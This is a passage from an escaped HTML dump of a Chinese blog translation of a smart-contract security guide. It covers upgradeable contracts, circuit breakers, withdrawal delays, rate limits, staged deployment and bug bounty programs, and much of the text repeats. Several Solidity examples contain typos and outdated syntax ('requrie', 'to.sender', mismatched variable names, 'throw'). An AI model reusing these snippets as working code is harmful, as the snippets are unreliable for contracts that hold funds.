来转发数据和调用</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Relay　&#123;</span><br><span class=\"line\">\taddress public currentVersion;</span><br><span class=\"line\">\taddress public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier onlyOwner() &#123;</span><br><span class=\"line\">\t\trequire(msg.sender == owner);</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction Relay(address initAddr) &#123;</span><br><span class=\"line\">\t\tcurrentVersion = initAddr;</span><br><span class=\"line\">\t\towner = msg.sender; // this owner may be another contract with multisig, not a single contract owner</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction changeContract(address newVersion) public onlyOwner() &#123;</span><br><span class=\"line\">\t\tcurrentVersion = newVersion;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction() &#123;</span><br><span class=\"line\">\t\trequire(currentVersion.delegatecall(msg.data));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个方式避免了之前的问题，但他本身又存在问题。在这个合约中存储数据的时候你必须极度小心。如果你的新合约和第一个的存储结构不同，你的数据可能会被破坏。另外，这种模式的简单版本不会从函数返回值，只会转发他们，这限制了它的适用性。（<a href=\"https://github.com/ownage-ltd/ether-router\" target=\"_blank\" rel=\"noopener\">更复杂的实现方式</a>则是试图通过内联汇编代码和返回大小的注册表来解决这个问题。）</p>\n<p>不管你的方法是什么，重要的是要有某种方法来升级你的合约，否则当不可避免的错误被发现时，它们将变得无法使用。</p>\n<h3 id=\"断路器（暂停合约功能）\"><a href=\"#断路器（暂停合约功能）\" class=\"headerlink\" title=\"断路器（暂停合约功能）\"></a>断路器（暂停合约功能）</h3><p>当触发了确定的条件，断路器会停止当前的执行，而对于新发现的错误，它也十分有用。举例来说，如果发现了错误，合约中除了提币操作，其他大多数操作可能都会暂停。你既可以给某些可信的一方触发断路器的能力，也可以设定在某些条件满足时自动触发某些断路器的程序规则。</p>\n<p>例如:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool private stopped = false;</span><br><span class=\"line\">address private owner;</span><br><span class=\"line\"></span><br><span class=\"line\">modifier isAdmin() &#123;</span><br><span class=\"line\">\trequire(msg.sender == owner);</span><br><span class=\"line\">\t_;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function toggleContractActive() isAdmin public &#123;</span><br><span class=\"line\">\t// You can add an additional modifier that restricts stopping a contract to be based on another action, such as a vote of users</span><br><span class=\"line\">\tstopped = !stopped;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">modifier stopInEmergency &#123;if (!stopped) _;&#125;</span><br><span class=\"line\">modifier onlyInEmergency &#123;if（stopped）_;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function deposit() stopInEmergency public &#123;</span><br><span class=\"line\">\t// some code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw() onlyInEmergency public &#123;</span><br><span class=\"line\">\t// some code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"速度碰撞（延迟合约动作）\"><a href=\"#速度碰撞（延迟合约动作）\" class=\"headerlink\" title=\"速度碰撞（延迟合约动作）\"></a>速度碰撞（延迟合约动作）</h3><p>速度碰撞使得动作变慢，所以如果发生了恶意的动作，就有时间来恢复了。举例来说，<a href=\"https://github.com/slockit/DAO/\" target=\"_blank\" rel=\"noopener\">The DAO</a>在一个拆分 DAO 的成功请求和完成该请求之间需要 27 天的时间。这保证了资金被保存在合约内，增加了恢复的可能性。在 DAO 这个例子中，在速度碰撞期间内无法采取有效的行动，但是与其他技术相结合，这就相当有效了。</p>\n<p>例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct RequestedWithdrawal &#123;</span><br><span class=\"line\">\tuint amount;</span><br><span class=\"line\">\tuint time;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mapping(address =&gt; uint) private balances;</span><br><span class=\"line\">mapping(address =&gt; RequestedWithdrawal) private requestedWithdrawals</span><br><span class=\"line\">uint constant withdrawalWaitPeriod = 28 days; // 4 weeks</span><br><span class=\"line\"></span><br><span class=\"line\">function requestWithdrawal() public &#123;</span><br><span class=\"line\">\t if (balances[msg.sender] &gt; 0) &#123;</span><br><span class=\"line\">\t \tuint amountToWithdraw = balances[msg.sender];</span><br><span class=\"line\">\t \tbalances[msg.sender] = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t \trequestedWithdrawals[msg.sender] = RequestedWithdrawal(&#123;</span><br><span class=\"line\">\t \t\tamount: amountToWithdraw,</span><br><span class=\"line\">\t \t\ttime: now</span><br><span class=\"line\">\t \t\t&#125;);</span><br><span class=\"line\">\t &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw() public &#123;</span><br><span class=\"line\">\tif(requestedWithdrawals[msg.sender].amount &gt; 0 &amp;&amp; now &gt; requestedWithdrawals[msg.sender].time + withdrawalWaitPeriod) &#123;</span><br><span class=\"line\">\t\tuint amountToWithdraw = requestedWithdrawals[msg.sender].amount;</span><br><span class=\"line\">\t\trequestedWithdrawals[msg.sender].amount = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\trequire(msg.sender.send(amountToWithdraw));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"比例限制\"><a href=\"#比例限制\" class=\"headerlink\" title=\"比例限制\"></a>比例限制</h3><p>比例限制停止或要求实质性变更的通过。举例来说，一个存款人在一定时期内只允许提取一定数量或一定百分比的存款（如 一天最多 100 ether）- 另外在该时期内的提币将会失败或者需要一些特殊的审批通过。或者比例限制可以通过在该时期内合约只能提取一定的 token 的形式在合约层面实现。</p>\n<p>例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CircuitBreaker &#123;</span><br><span class=\"line\">\tstruct Transfer &#123;</span><br><span class=\"line\">\t\tuint amount;</span><br><span class=\"line\">\t\taddress to;</span><br><span class=\"line\">\t\tuint releaseBlock;</span><br><span class=\"line\">\t\tbool released;</span><br><span class=\"line\">\t\tbool stopped;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tTransfer[] public transfers;</span><br><span class=\"line\"></span><br><span class=\"line\">\taddress public curator;</span><br><span class=\"line\">\taddress public authorizedSender;</span><br><span class=\"line\">\tuint public period;</span><br><span class=\"line\">\tuint public limit;</span><br><span class=\"line\"></span><br><span class=\"line\">\tuint public currentPeriodEnd;</span><br><span class=\"line\">\tuint public currentPeriodAmount;</span><br><span class=\"line\"></span><br><span class=\"line\">\tevent PendingTransfer(uint id, uint amount, address to, uint releaseBlock);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction CircuitBreaker(address _curator, address _authorizedSender, uint _period, uint _limit) &#123;</span><br><span class=\"line\">\t\tcurator = _curator;</span><br><span class=\"line\">\t\tperiod = _period;</span><br><span class=\"line\">\t\tlimit = _limit;</span><br><span class=\"line\">\t\tauthorizedSender = _authorizedSender;</span><br><span class=\"line\">\t\tcurrentPeriodEnd = block.number + period;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction transfer(uint amount, address to) &#123;</span><br><span class=\"line\">\t\tif (msg.sender == authorizedSender) &#123;</span><br><span class=\"line\">\t\t\tupdatePeriod();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tif (currentPeriodAmount + amount &gt; limit) &#123;</span><br><span class=\"line\">\t\t\t\tuint releaseBlock = block.number + period;</span><br><span class=\"line\">\t\t\t\tPendingTransfer(transfer.length, amount, to, releaseBlock);</span><br><span class=\"line\">\t\t\t\ttransfer.push(Transfer(amount, to, releaseBlock, false, false));</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\tcurrentPeriodAmount += amount;</span><br><span class=\"line\">\t\t\t\ttransfers.push(Transfer(amount, to, block.number, true, false));</span><br><span class=\"line\">\t\t\t\tif (!to.sender(amount)) throw;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction updatePeriod() &#123;</span><br><span class=\"line\">\t\tif (currentPeriodEnd &lt; block.number) &#123;</span><br><span class=\"line\">\t\t\tcurrentPeriodEnd = block.number + period;</span><br><span class=\"line\">\t\t\tcurrentPeriodAmount = 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction releasePendingTransfer(uint id) &#123;</span><br><span class=\"line\">\t\tTransfer transfer = transfers[id];</span><br><span class=\"line\">\t\tif (transfer.releaseBlock &lt;= block.number &amp;&amp; !transfer.released &amp;&amp; !transfer.stopped) &#123;</span><br><span class=\"line\">\t\t\ttransfer.released = true;</span><br><span class=\"line\">\t\t\tif (!transfer.to.send(transfer.amount)) throw;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction stopTransfer(uint id) &#123;</span><br><span class=\"line\">\t\tif (msg.sender == curator) &#123;</span><br><span class=\"line\">\t\t\ttransfer[id].stopped = true;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"合约部署\"><a href=\"#合约部署\" class=\"headerlink\" title=\"合约部署\"></a>合约部署</h3><p>在资金处于危险之前，合约应该有大量的长期的测试阶段。</p>\n<p>最小程度，你应该：</p>\n<ul>\n<li>有一个完整的测试套件，覆盖了 100%（或者接近） 的测试。</li>\n<li>部署在你自己的测试网络上。</li>\n<li>经过大量的测试之后才能发布在公共测试网络上，并且要发布 bug 悬赏。</li>\n<li>详尽的测试应该包括大量不同的玩家同时与合约交互。</li>\n<li>将 beta 版本部署在主网上，降低风险。</li>\n</ul>\n<h5 id=\"自动防护\"><a href=\"#自动防护\" class=\"headerlink\" title=\"自动防护\"></a>自动防护</h5><p>在测试期，你可以设置在一定时期之后自动反对来防止任何的操作。举例来说，一个 alpha 版本的合约在工作几周之后会自动关闭所有的操作，除了最终的提币。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier isActive() &#123;</span><br><span class=\"line\">\trequrie(block.number &lt;= SOME_BLOCK_NUMBER);</span><br><span class=\"line\">\t_;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function deposit() public isActive &#123;</span><br><span class=\"line\">\t// some code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw() public &#123;</span><br><span class=\"line\">\t// some code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"限制每个用户-合约的-ETH-数量\"><a href=\"#限制每个用户-合约的-ETH-数量\" class=\"headerlink\" title=\"限制每个用户/合约的 ETH 数量\"></a>限制每个用户/合约的 ETH 数量</h5><p>在早期阶段，你可以限制任何用户（或者整个合约）的 ETH 数量来降低风险。</p>\n<h3 id=\"bug-悬赏计划\"><a href=\"#bug-悬赏计划\" class=\"headerlink\" title=\"bug 悬赏计划\"></a>bug 悬赏计划</h3><p>一些悬赏计划的技巧：</p>\n<ul>\n<li>决定奖励哪些货币（BTC 或者 ETH）</li>\n<li>决定悬赏的总预算</li>\n<li>从预算中确定三层奖励：</li>\n<li>你愿意付出的最小奖励</li>\n<li>最高的奖励是可以常常被获得的</li>\n<li>如果存在非常严重的漏洞，将额外给予的奖励范围</li>\n<li>确定赏金评委是谁（3人可能是典型的理想人选）</li>\n<li>首席开发者可能应该是赏金评委之一</li>\n<li>当收到错误报告时，首席开发人员应该根据评委的建议评估错误的严重程度</li>\n<li>在这个阶段的工作应该是在一个私有仓库，并归档在 Github 上提出的问题</li>\n<li>如果这是一个应该修复的 bug，那么在私有仓库中，开发人员应该编写一个测试用例，这个用例应该会失败，从而确认 bug</li>\n<li>开发人员应该执行修复程序并确保测试通过; 根据需要编写额外的测试</li>\n<li>给赏金猎人展示修复工作; 将修复合并入公共仓库是一种方法</li>\n<li>确定赏金猎人是否有任何其他有关修复的反馈</li>\n<li>赏金评委根据他们对 bug 的 <em>可能性</em> 和 <em>影响</em> 的评估来确定奖励的大小</li>\n<li>在整个过程中保持奖励参与者的信息，然后努力避免延误向他们发送奖励</li>\n</ul>\n<p>有关三种奖励的例子，请参阅<a href=\"https://bounty.ethereum.org/\" target=\"_blank\" rel=\"noopener\">以太坊的赏金计划</a>：</p>\n<blockquote>\n<p>支付的奖励价值取决于影响的严重程度。 对轻微“无害”错误的奖励最少 0.05 BTC。例如，导致共识问题的错误将奖励高达 5 BTC。 如果存在非常严重的漏洞，可能获得更高的奖励（高达 25 BTC）。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"软件工程技术\"><a href=\"#软件工程技术\" class=\"headerlink\" title=\"软件工程技术\"></a><a href=\"https://consensys.github.io/smart-contract-best-practices/software_engineering/\" target=\"_blank\" rel=\"noopener\">软件工程技术</a></h2><p>如我们在<a href=\"https://consensys.github.io/smart-contract-best-practices/software_engineering/#general-philosophy\" target=\"_blank\" rel=\"noopener\">常规理念</a>中讨论的一样，其不足以保护你来抵御已知的攻击。由于区块链上的失败成本可能非常高，因此您还必须调整自己编写软件的方式，以解决该风险。</p>\n<p>我们主张的方式是 “做好失败的准备”。不可能提前知道你的代码是否安全。但是，你可以以使其能够优雅地失败并且损失最小的方式来构建你的合约。本部分提出了多种技术来帮助你为失败做好准备。</p>\n<p>注意：当你新增一个组件到你的系统中时，总是伴随着一定的风险。一个不好的防故障设计本身可能会成为一个漏洞 - 当它与大量优秀的防故障设计交互时。请仔细考虑你在合约中使用的每种技术，并仔细考虑它们是如何协同合作以创建一个健壮的系统。</p>\n<h3 id=\"改进被破坏的合约\"><a href=\"#改进被破坏的合约\" class=\"headerlink\" title=\"改进被破坏的合约\"></a>改进被破坏的合约</h3><p>当错误发生或者需要做升级的时候，代码会需要被更改。当发现一个 bug 却无法处理的时候，十分糟糕。</p>\n<p>为智能合约设计一个有效的改进系统是一个十分活跃的研究领域，而我们不会覆盖本文档中的所有难题。但是，存在两种最常用的基本方法。其中更简单的一种是使用一个注册合约来持有最新版本合约的地址。对于合约用户来说，更连贯的方法是拥有一份可以将调用和数据转发到合约的最新版本的合约。</p>\n<p>不管是什么技术，模块化和组件间良好的分离是十分重要的，这样代码的修改就不会破坏功能，独立的数据，或者需要大量成本来移植。尤其是将复杂的逻辑从你的数据存储分离通常是有益的，这样你就不需要为了修改功能而重新创建所有的数据。</p>\n<p>提供一种安全的方式可以让多方去决定升级代码也十分重要。由你的合约决定，代码修改被通过的前提是只需要一方可信的，一个团队，或者是所有股东的投票才可以。如果这个过程需要一些时间，你需要考虑是否有其他方法可以在发生攻击时迅速做出反应，如<a href=\"https://github.com/ConsenSys/smart-contract-best-practices/#circuit-breakers-pause-contract-functionality\" target=\"_blank\" rel=\"noopener\">紧急停止或者是熔断机制</a>。</p>\n<p><strong>示例 1:使用一个注册合约来存储另一个合约的最新版本</strong></p>\n<p>在这个例子中，调用不会被发送，所以用户应该在每一次与合约交互之前都获取一下当前的地址。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SomeRegister &#123;</span><br><span class=\"line\">\taddress backendContract;</span><br><span class=\"line\">\taddress[] previousBackends;</span><br><span class=\"line\">\taddress owner;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction SomeRegister() &#123;</span><br><span class=\"line\">\t\towner = msg.sender;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier onlyOwner() &#123;</span><br><span class=\"line\">\t\trequire(msg.sender == owner)</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction changeBackend(address newBackend) public onlyOwner() returns (bool) &#123;</span><br><span class=\"line\">\t\tif (newBackend != backendContract) &#123;</span><br><span class=\"line\">\t\t\tpreviousBackend.push(backendContract);</span><br><span class=\"line\">\t\t\tbackendContract = newBackend;</span><br><span class=\"line\">\t\t\treturn true;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个方法有两个缺点：</p>\n<ol>\n<li>用户必须总是检查当前的地址，如果不这么做就有使用旧版本合约的风险。</li>\n<li>你需要在替换合约的时候小心的思考如果处理合约内的数据。</li>\n</ol>\n<p>另一种方法是让合约将调用和数据转发给合约的最新版本：</p>\n<p><strong>示例 2：<a href=\"http://ethereum.stackexchange.com/questions/2404/upgradeable-contracts\" target=\"_blank\" rel=\"noopener\">使用 <code>DELEGATECALL</code></a> 来转发数据和调用</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Relay　&#123;</span><br><span class=\"line\">\taddress public currentVersion;</span><br><span class=\"line\">\taddress public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmodifier onlyOwner() &#123;</span><br><span class=\"line\">\t\trequire(msg.sender == owner);</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction Relay(address initAddr) &#123;</span><br><span class=\"line\">\t\tcurrentVersion = initAddr;</span><br><span class=\"line\">\t\towner = msg.sender; // this owner may be another contract with multisig, not a single contract owner</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction changeContract(address newVersion) public onlyOwner() &#123;</span><br><span class=\"line\">\t\tcurrentVersion = newVersion;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction() &#123;</span><br><span class=\"line\">\t\trequire(currentVersion.delegatecall(msg.data));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个方式避免了之前的问题，但他本身又存在问题。在这个合约中存储数据的时候你必须极度小心。如果你的新合约和第一个的存储结构不同，你的数据可能会被破坏。另外，这种模式的简单版本不会从函数返回值，只会转发他们，这限制了它的适用性。（<a href=\"https://github.com/ownage-ltd/ether-router\" target=\"_blank\" rel=\"noopener\">更复杂的实现方式</a>则是试图通过内联汇编代码和返回大小的注册表来解决这个问题。）</p>\n<p>不管你的方法是什么，重要的是要有某种方法来升级你的合约，否则当不可避免的错误被发现时，它们将变得无法使用。</p>\n<h3 id=\"断路器（暂停合约功能）\"><a href=\"#断路器（暂停合约功能）\" class=\"headerlink\" title=\"断路器（暂停合约功能）\"></a>断路器（暂停合约功能）</h3><p>当触发了确定的条件，断路器会停止当前的执行，而对于新发现的错误，它也十分有用。举例来说，如果发现了错误，合约中除了提币操作，其他大多数操作可能都会暂停。你既可以给某些可信的一方触发断路器的能力，也可以设定在某些条件满足时自动触发某些断路器的程序规则。</p>\n<p>例如:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool private stopped = false;</span><br><span class=\"line\">address private owner;</span><br><span class=\"line\"></span><br><span class=\"line\">modifier isAdmin() &#123;</span><br><span class=\"line\">\trequire(msg.sender == owner);</span><br><span class=\"line\">\t_;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function toggleContractActive() isAdmin public &#123;</span><br><span class=\"line\">\t// You can add an additional modifier that restricts stopping a contract to be based on another action, such as a vote of users</span><br><span class=\"line\">\tstopped = !stopped;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">modifier stopInEmergency &#123;if (!stopped) _;&#125;</span><br><span class=\"line\">modifier onlyInEmergency &#123;if（stopped）_;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function deposit() stopInEmergency public &#123;</span><br><span class=\"line\">\t// some code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function withdraw() onlyInEmergency public &#123;</span><br><span class=\"line\">\t// some code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"速度碰撞（延迟合约动作）\"><a href=\"#速度碰撞（延迟合约动作）\" class=\"headerlink\" title=\"速度碰撞（延迟合约动作）\"></a>速度碰撞（延迟合约动作）</h3><p>速度碰撞使得动作变慢，所以如果发生了恶意的动作，就有时间来恢复了。举例来说，<a href=\"https://github.com/slockit/DAO/\" target=\"_blank\" rel=\"noopener\">The DAO</a>在一个拆分 DAO 的成功请求和完成该请求之间需要 27 天的时间。这保证了资金被保存在合约内，增加了恢复的可能性。在 DAO 这个例子中，在速度碰撞期间内无法采取有效的行动，但是与其他技术相结合，这就相当有效了。</p>\n<p>例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct RequestedWithdrawal &#123;</span><br><span class=\"line\">\tuint amount;</span><br><span class=\"line\">\tuint time;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mapping(address =&gt; uint) private balances;</span><br><span class=\"line\">mapping(address =&gt; RequestedWithdrawal) private requestedWithdrawals</span><br><span class=\"line\">uint constant withdrawalWaitPeriod = 28 days; // 4 weeks</span><br><span class=\"line\"></span><br><span class=\"line\">function requestWithdrawal() public &#123;</span><br><span class=\"line\">\t if (balances[msg.sender] &gt; 0) &#123;</span><br><span class=\"line\">\t \tuint amountToWithdraw = balances[msg.sender];</span><br><span class=\"line\">\t \tbalances[msg.sender] = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t \trequestedWithdrawals[msg.sender] = RequestedWithdrawal(&#123;</span><br><span class=\"line\">\t \t\tamount: amountToWithdraw,</span><br><span class=\"line\">\t \t\ttime: now</span><br><span class=\"line\">\t \t\t&#125;);</span><br><span 